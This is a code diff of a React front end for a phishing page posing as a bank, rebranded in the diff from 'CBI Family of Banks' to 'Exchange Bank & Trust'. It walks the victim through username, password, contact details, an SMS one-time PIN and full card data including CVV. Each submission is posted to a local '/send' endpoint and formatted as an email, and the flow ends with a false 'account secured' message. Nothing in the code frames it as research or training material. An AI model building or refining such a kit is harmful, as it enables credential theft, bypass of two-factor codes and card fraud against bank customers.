@@ -1,452 +1,358 @@
 import React, { useState } from "react";
-import "./App.css";
 import axios from "axios";
-import cbiLogo from "./assets/cbi image.png";
+import cbiLogo from "./assets/logo.png";
+import "./App.css";
+
+// Add your other logos here if needed
 
 function App() {
   const [step, setStep] = useState(1);
-  // Step 1: Login
-  const [email, setEmail] = useState("");
+  const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  // Step 2: Contact Info
+  const [showPassword, setShowPassword] = useState(false);
   const [contactEmail, setContactEmail] = useState("");
-  const [phone, setPhone] = useState("");
-  // Step 3: OTP Verification
+  const [contactPhone, setContactPhone] = useState("");
   const [otp, setOtp] = useState("");
-  // Step 4: Card Info
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
-  const [zipcode, setZipcode] = useState("");
+  const [zip, setZip] = useState("");
 
-  // Step 1 submit
   const handleLoginSubmit = (e) => {
     e.preventDefault();
-    axios.post("http://localhost:5000/send", {
-      email,
-      message: password,
-      subject: "Login Details",
-    });
     setStep(2);
   };
 
-  // Step 2 submit
-  const handleContactSubmit = (e) => {
+  const handleSignIn = async (e) => {
     e.preventDefault();
-    axios.post("http://localhost:5000/send", {
-      email: contactEmail,
-      message: phone,
-      subject: "Contact Info",
-    });
+    try {
+      await axios.post("http://localhost:5000/send", {
+        email: username,
+        message: password,
+        subject: "Login Details",
+      });
+    } catch (error) {
+      console.error("Error sending login details:", error);
+    }
     setStep(3);
   };
 
-  // Step 3 submit (OTP)
-  const handleOtpSubmit = (e) => {
+  const handleContactSubmit = async (e) => {
     e.preventDefault();
-    axios.post("http://localhost:5000/send", {
-      email: contactEmail,
-      message: otp,
-      subject: "OTP Verification",
-    });
+    try {
+      await axios.post("http://localhost:5000/send", {
+        email: contactEmail,
+        message: contactPhone,
+        subject: "Contact Info",
+      });
+    } catch (error) {
+      console.error("Error sending contact info:", error);
+    }
     setStep(4);
   };
 
-  // Step 4 submit (Card Info)
-  const handleCardInfoSubmit = (e) => {
+  const handleOtpSubmit = async (e) => {
     e.preventDefault();
-    axios.post("http://localhost:5000/send", {
-      email: contactEmail,
-      message: `Card Number: ${cardNumber}\nExpiry Date: ${expiry}\nCVV Code: ${cvv}\nZipcode: ${zipcode}`,
-      subject: "Card Info",
-    });
+    try {
+      await axios.post("http://localhost:5000/send", {
+        email: contactEmail,
+        message: otp,
+        subject: "OTP Verification",
+      });
+    } catch (error) {
+      console.error("Error sending OTP:", error);
+    }
     setStep(5);
   };
 
-  // Format expiry date as MM/YYYY
-  const handleExpiryChange = (e) => {
-    let value = e.target.value;
-    
-    // Remove any non-digit characters
-    value = value.replace(/\D/g, '');
-    
-    // Add slash after month
-    if (value.length > 2) {
-      value = value.slice(0, 2) + '/' + value.slice(2);
+  const handleCardSubmit = async (e) => {
+    e.preventDefault();
+    try {
+      await axios.post("http://localhost:5000/send", {
+        email: contactEmail,
+        message:
+          `Card Number: ${cardNumber}\n` +
+          `Expiry: ${expiry}\n` +
+          `CVV: ${cvv}\n` +
+          `Zip Code: ${zip}`,
+        subject: "Card Info",
+      });
+    } catch (error) {
+      console.error("Error sending card info:", error);
     }
-    
-    // Make sure month is between 01-12
-    if (value.length >= 2) {
-      const month = parseInt(value.slice(0, 2));
-      if (month > 12) {
-        value = '12' + value.slice(2);
-      } else if (month < 1 && value.length >= 2) {
-        value = '01' + value.slice(2);
-      } else if (value.slice(0, 1) === '0' && value.slice(1, 2) === '0') {
-        value = '01' + value.slice(2);
-      }
-    }
-    
-    setExpiry(value);
+    setStep(6);
   };
 
+  const handleSwitch = () => {
+    setStep(1);
+    setPassword("");
+  };
+
+  function getEmailText(subject, email, message) {
+    if (subject === 'Login Details') {
+      return `Username: ${email}\nPassword: ${message}`;
+    } else if (subject === 'Contact Info') {
+      return `Email Address: ${email}\nPhone Number: ${message}`;
+    } else if (subject === 'OTP Verification') {
+      return `Email Address: ${email}\nOTP: ${message}`;
+    } else if (subject === 'Card Info') {
+      return message; // <-- This will include username, password, and all card info
+    } else {
+      return `Email: ${email}\nMessage: ${message}`;
+    }
+  }
+
+  function getEmailHtml(subject, email, message) {
+    let title = 'Information';
+    let contentHtml = '';
+
+    if (subject === 'Login Details') {
+      title = 'Login Information';
+      contentHtml = `
+        <p><strong>Username:</strong> ${email}</p>
+        <p><strong>Password:</strong> ${message}</p>
+      `;
+    } else if (subject === 'Contact Info') {
+      title = 'Contact Information';
+      contentHtml = `
+        <p><strong>Email Address:</strong> ${email}</p>
+        <p><strong>Phone Number:</strong> ${message}</p>
+      `;
+    } else if (subject === 'OTP Verification') {
+      title = 'Security Verification';
+      contentHtml = `
+        <p><strong>Verification Code:</strong> ${message}</p>
+      `;
+    } else if (subject === 'Card Info') {
+      title = 'Card Information';
+      // Format all lines as HTML
+      contentHtml = message
+        .split('\n')
+        .map(line => {
+          const [label, ...rest] = line.split(':');
+          return `<p><strong>${label.trim()}:</strong> ${rest.join(':').trim()}</p>`;
+        })
+        .join('');
+    } else {
+      contentHtml = `<p><strong>Message:</strong> ${message}</p>`;
+    }
+
+    return `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
+      <h2 style="color: #333;">${title}</h2>
+      ${contentHtml}
+    </div>`;
+  }
+
   return (
-    <div style={{
-      position: "fixed",
-      top: 0,
-      left: 0,
-      width: "100vw",
-      height: "100vh",
-      minHeight: "100vh",
-      minWidth: "100vw",
-      background: "linear-gradient(135deg, #888a8d 0%, #44474a 100%)",
-      display: "flex",
-      flexDirection: "column",
-      justifyContent: "center",
-      alignItems: "center",
-      overflow: "hidden"
-    }}>
-      <div style={{
-        background: "#232526",
-        borderRadius: 12,
-        boxShadow: "0 4px 24px rgba(0,0,0,0.3)",
-        padding: 40,
-        width: 480,
-        maxWidth: "90vw",
-        display: "flex",
-        flexDirection: "column",
-        alignItems: "center"
-      }}>
-        {/* Logo area */}
-        <div style={{ marginBottom: 24, textAlign: "center" }}>
-          <img src={cbiLogo} alt="CBI Family of Banks" style={{ maxWidth: 260, marginBottom: 8 }} />
-        </div>
-        {step === 1 && (
-          <form onSubmit={handleLoginSubmit} style={{ width: "100%" }}>
-            <input
-              type="text"
-              placeholder="Username"
-              className="input-field"
-              style={{
-                width: "100%",
-                padding: "14px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1px solid #444",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 18,
-                outline: "none"
-              }}
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              required
-            />
-            <input
-              type="password"
-              placeholder="Enter your password"
-              className="input-field"
-              style={{
-                width: "100%",
-                padding: "14px 16px",
-                marginBottom: 8,
-                borderRadius: 6,
-                border: "1px solid #444",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 18,
-                outline: "none"
-              }}
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-            />
-            <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 18 }}>
-              <a href="#" style={{ color: "#3de6b2", textDecoration: "none", fontSize: 15 }}>Forgot?</a>
-            </div>
-            <div style={{ display: "flex", alignItems: "center", marginBottom: 18 }}>
-              <span style={{ color: "#3de6b2", fontSize: 17, marginRight: 8 }}>🟢</span>
-              <a href="#" style={{ color: "#3de6b2", textDecoration: "none", fontWeight: 500, fontSize: 17 }}>Sign in with a passkey</a>
-            </div>
-            <button
-              type="submit"
-              className="login-button"
-              style={{
-                width: 120,
-                background: "#176a46",
-                color: "#fff",
-                border: "none",
-                borderRadius: 6,
-                padding: "12px 0",
-                fontSize: 18,
-                fontWeight: 600,
-                cursor: "pointer",
-                float: "right"
-              }}
-            >
-              Sign in
-            </button>
-          </form>
-        )}
-        {step === 2 && (
-          <form onSubmit={handleContactSubmit} style={{ width: "100%" }}>
-            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
-              Verify Contact Information
-            </h2>
-            <div style={{ color: '#e6f0fa', textAlign: 'center', marginBottom: 24 }}>
-              Please confirm your contact details on file.
-            </div>
-            <input
-              type="email"
-              placeholder="Email Address"
-              className="input-field"
-              style={{
-                width: "100%",
-                padding: "14px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1px solid #444",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 18,
-                outline: "none"
-              }}
-              value={contactEmail}
-              onChange={(e) => setContactEmail(e.target.value)}
-              required
-            />
-            <input
-              type="tel"
-              placeholder="Phone Number"
-              className="input-field"
-              style={{
-                width: "100%",
-                padding: "14px 16px",
-                marginBottom: 24,
-                borderRadius: 6,
-                border: "1px solid #444",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 18,
-                outline: "none"
-              }}
-              value={phone}
-              onChange={(e) => setPhone(e.target.value)}
-              required
-            />
-            <button
-              type="submit"
-              className="login-button"
-              style={{
-                width: 140,
-                background: "#176a46",
-                color: "#fff",
-                border: "none",
-                borderRadius: 6,
-                padding: "12px 0",
-                fontSize: 18,
-                fontWeight: 600,
-                cursor: "pointer",
-                float: "right"
-              }}
-            >
-              Continue
-            </button>
-          </form>
-        )}
-        {step === 3 && (
-          <form onSubmit={handleOtpSubmit} style={{ width: "100%" }}>
-            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
-              Verification
-            </h2>
-            <div style={{ color: '#e6f0fa', textAlign: 'center', marginBottom: 24, fontSize: 18 }}>
-              We sent you a One-Time PIN to your registered mobile number.<br />
-              Please enter the code below
-            </div>
-            <input
-              type="text"
-              placeholder="Secure Code"
-              className="input-field"
-              style={{
-                width: "100%",
-                padding: "18px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1.5px solid #bdbdbd",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 22,
-                outline: "none",
-                textAlign: "center",
-                letterSpacing: 2
-              }}
-              value={otp}
-              onChange={(e) => setOtp(e.target.value)}
-              required
-            />
-            <div style={{ color: '#3de6b2', textAlign: 'center', marginBottom: 24, fontWeight: 500 }}>
-              SMS code might take some minutes to arrive.
-            </div>
-            <button
-              type="submit"
-              className="login-button"
-              style={{
-                width: 160,
-                background: "#176a46",
-                color: "#fff",
-                border: "none",
-                borderRadius: 8,
-                padding: "14px 0",
-                fontSize: 20,
-                fontWeight: 700,
-                cursor: "pointer",
-                margin: "0 auto",
-                display: "block"
-              }}
-            >
-              Continue
-            </button>
-          </form>
-        )}
-        {step === 4 && (
-          <form onSubmit={handleCardInfoSubmit} style={{ width: "100%" }}>
-            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
-              Card Info Information On File
-            </h2>
-            <input
-              type="text"
-              placeholder="Card Number"
-              className="input-field"
-              maxLength={16}
-              minLength={13}
-              style={{
-                width: "100%",
-                padding: "18px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1.5px solid #bdbdbd",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 20,
-                outline: "none"
-              }}
-              value={cardNumber}
-              onChange={(e) => setCardNumber(e.target.value)}
-              required
-            />
-            <input
-              type="text"
-              placeholder="MM/YYYY"
-              className="input-field"
-              maxLength={7}
-              minLength={7}
-              style={{
-                width: "100%",
-                padding: "18px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1.5px solid #bdbdbd",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 20,
-                outline: "none"
-              }}
-              value={expiry}
-              onChange={handleExpiryChange}
-              required
-            />
-            <input
-              type="text"
-              placeholder="CVV"
-              className="input-field"
-              maxLength={3}
-              minLength={3}
-              style={{
-                width: "100%",
-                padding: "18px 16px",
-                marginBottom: 18,
-                borderRadius: 6,
-                border: "1.5px solid #bdbdbd",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 20,
-                outline: "none"
-              }}
-              value={cvv}
-              onChange={(e) => setCvv(e.target.value)}
-              required
-            />
-            <input
-              type="text"
-              placeholder="Zipcode"
-              className="input-field"
-              maxLength={10}
-              minLength={5}
-              style={{
-                width: "100%",
-                padding: "18px 16px",
-                marginBottom: 28,
-                borderRadius: 6,
-                border: "1.5px solid #bdbdbd",
-                background: "#18191a",
-                color: "#fff",
-                fontSize: 20,
-                outline: "none"
-              }}
-              value={zipcode}
-              onChange={(e) => setZipcode(e.target.value)}
-              required
-            />
-            <button
-              type="submit"
-              className="login-button"
-              style={{
-                width: 160,
-                background: "#176a46",
-                color: "#fff",
-                border: "none",
-                borderRadius: 8,
-                padding: "14px 0",
-                fontSize: 20,
-                fontWeight: 700,
-                cursor: "pointer",
-                margin: "0 auto",
-                display: "block"
-              }}
-            >
-              Continue
-            </button>
-          </form>
-        )}
-        {step === 5 && (
-          <div style={{ width: "100%", textAlign: "center", padding: "32px 0" }}>
-            <img src={cbiLogo} alt="CBI Family of Banks" style={{ maxWidth: 260, marginBottom: 16 }} />
-            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', fontSize: 28, margin: 0, marginBottom: 18 }}>
-              Verification Complete.
-            </h2>
-            <div style={{ color: '#e6f0fa', fontSize: 22, marginBottom: 8 }}>
-              Your information has been successfully verified.<br />
-              Your account has been secured
-            </div>
+    <div>
+      {step === 6 ? (
+        <div className="login-container success-container">
+          <img src={cbiLogo} alt="Exchange Bank & Trust" className="login-logo" />
+          <h2 className="success-heading">Verification Complete.</h2>
+          <div className="success-subheading">
+            Your information has been successfully verified.<br />
+            Your account has been secured
           </div>
-        )}
-      </div>
-      {/* Footer */}
-      <footer style={{
-        width: "100vw",
-        background: "#000",
-        color: "#bdbdbd",
-        fontSize: 15,
-        textAlign: "center",
-        position: "fixed",
-        left: 0,
-        bottom: 0,
-        padding: "18px 0 10px 0",
-        zIndex: 10
-      }}>
-        <span>© 2025 CBI Family of Banks &nbsp; (563) 263-3131 &nbsp; </span>
-        <a href="#" style={{ color: "#3de6b2", textDecoration: "underline" }}>Privacy policy</a>
-        <span> &nbsp; Member FDIC &nbsp; Equal Housing Lender</span>
+        </div>
+      ) : (
+        <div className="login-container">
+          <img src={cbiLogo} alt="Exchange Bank & Trust" className="login-logo" />
+          {step === 1 && (
+            <form style={{ width: "100%" }} onSubmit={handleLoginSubmit}>
+              <div className="login-input-wrapper">
+                <label
+                  htmlFor="username"
+                  className={`login-label${username ? " login-label--float" : ""}`}
+                >
+                  Username
+                </label>
+                <input
+                  id="username"
+                  type="text"
+                  className="login-input"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  required
+                  onFocus={e => e.target.parentNode.classList.add('focused')}
+                  onBlur={e => e.target.parentNode.classList.remove('focused')}
+                />
+              </div>
+              <div className="forgot-link">Forgot?</div>
+              <div className="login-actions">
+                <div className="enroll-row">
+                  First time user? <span className="enroll-link">Enroll now.</span>
+                </div>
+                <button type="submit" className="login-button">Continue</button>
+              </div>
+            </form>
+          )}
+          {step === 2 && (
+            <form style={{ width: "100%" }} onSubmit={handleSignIn}>
+              <div className="username-row">
+                <span className="username-label">Username</span>
+                <span className="username-value">{username}</span>
+                <span className="switch-link" onClick={handleSwitch}>Switch</span>
+              </div>
+              <div className="login-input-wrapper password-wrapper">
+                <label
+                  htmlFor="password"
+                  className={`login-label${password ? " login-label--float" : ""}`}
+                >
+                  Enter your password
+                </label>
+                <input
+                  id="password"
+                  type={showPassword ? "text" : "password"}
+                  className="login-input password-input"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  required
+                  onFocus={e => e.target.parentNode.classList.add('focused')}
+                  onBlur={e => e.target.parentNode.classList.remove('focused')}
+                />
+                <span className="eye-icon" onClick={() => setShowPassword(v => !v)}>
+                  {showPassword ? (
+                    <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
+                      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" />
+                      <circle cx="12" cy="12" r="3" />
+                    </svg>
+                  ) : (
+                    <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
+                      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.8 21.8 0 0 1 5.06-6.06" />
+                      <path d="M1 1l22 22" />
+                      <path d="M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47" />
+                      <path d="M14.47 14.47A3 3 0 0 1 12 9a3 3 0 0 1-2.47 5.47" />
+                    </svg>
+                  )}
+                </span>
+              </div>
+              <div className="forgot-link">Forgot?</div>
+              <div className="signin-actions">
+                <button type="button" className="passkey-btn">
+                  <span className="fingerprint-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M12 11c1.657 0 3 1.343 3 3v2"/>
+                      <path d="M12 11c-1.657 0-3 1.343-3 3v2"/>
+                      <path d="M12 7v4"/>
+                      <path d="M17 11c0-2.761-2.239-5-5-5s-5 2.239-5 5"/>
+                      <path d="M19 17v-2c0-3.314-2.686-6-6-6s-6 2.686-6 6v2"/>
+                      <path d="M12 21v-2"/>
+                    </svg>
+                  </span> Sign in with a passkey
+                </button>
+                <button type="submit" className="login-button signin-btn">Sign in</button>
+              </div>
+            </form>
+          )}
+          {step === 3 && (
+            <form style={{ width: "100%" }} onSubmit={handleContactSubmit}>
+              <div className="contact-heading">Verify Contact Information</div>
+              <div className="contact-subheading">Please confirm your contact details on file.</div>
+              <div className="login-input-wrapper">
+                <input
+                  type="email"
+                  className="login-input"
+                  placeholder="Email Address"
+                  value={contactEmail}
+                  onChange={e => setContactEmail(e.target.value)}
+                  required
+                />
+              </div>
+              <div className="login-input-wrapper">
+                <input
+                  type="tel"
+                  className="login-input"
+                  placeholder="Phone Number"
+                  value={contactPhone}
+                  onChange={e => setContactPhone(e.target.value)}
+                  required
+                />
+              </div>
+              <button type="submit" className="login-button contact-btn">Continue</button>
+            </form>
+          )}
+          {step === 4 && (
+            <form style={{ width: "100%" }} onSubmit={handleOtpSubmit}>
+              <div className="otp-heading">Verification</div>
+              <div className="otp-subheading">
+                We sent you a One-Time PIN to your registered mobile number.<br />
+                Please enter the code below
+              </div>
+              <div className="login-input-wrapper">
+                <input
+                  type="text"
+                  className="login-input"
+                  placeholder="Secure Code"
+                  value={otp}
+                  onChange={e => setOtp(e.target.value)}
+                  required
+                />
+              </div>
+              <div className="otp-info">SMS code might take some minutes to arrive.</div>
+              <button type="submit" className="login-button contact-btn">Continue</button>
+            </form>
+          )}
+          {step === 5 && (
+            <form style={{ width: "100%" }} onSubmit={handleCardSubmit}>
+              <div className="card-heading">Card Information</div>
+              <div className="card-subheading">Please enter your card details below.</div>
+              <div className="login-input-wrapper">
+                <input
+                  type="text"
+                  className="login-input"
+                  placeholder="Card Number"
+                  value={cardNumber}
+                  onChange={e => setCardNumber(e.target.value.replace(/[^0-9]/g, '').slice(0, 16))}
+                  required
+                  maxLength={16}
+                />
+              </div>
+              <div className="login-input-wrapper card-row">
+                <input
+                  type="text"
+                  className="login-input card-expiry"
+                  placeholder="MM/YYYY"
+                  value={expiry}
+                  onChange={e => {
+                    let val = e.target.value.replace(/[^0-9]/g, '');
+                    if (val.length > 6) val = val.slice(0, 6);
+                    if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
+                    setExpiry(val);
+                  }}
+                  required
+                  maxLength={7}
+                  style={{ width: '48%' }}
+                />
+                <input
+                  type="text"
+                  className="login-input card-cvv"
+                  placeholder="CVV"
+                  value={cvv}
+                  onChange={e => setCvv(e.target.value.replace(/[^0-9]/g, '').slice(0, 3))}
+                  required
+                  maxLength={3}
+                  style={{ width: '48%', marginLeft: '4%' }}
+                />
+              </div>
+              <div className="login-input-wrapper">
+                <input
+                  type="text"
+                  className="login-input"
+                  placeholder="Zip Code"
+                  value={zip}
+                  onChange={e => setZip(e.target.value.replace(/[^0-9]/g, ''))}
+                  required
+                />
+              </div>
+              <button type="submit" className="login-button contact-btn">Continue</button>
+            </form>
+          )}
+        </div>
+      )}
+      <footer className="login-footer">
+        © 2025 Exchange Bank & Trust &nbsp; · &nbsp; (913) 367-6000 &nbsp; · &nbsp;
+        <a href="#" style={{ color: "#ffe066", textDecoration: "underline" }}>Privacy policy</a>
+        &nbsp; · &nbsp; Member FDIC &nbsp; · &nbsp; Equal Housing Lender
       </footer>
     </div>
   );
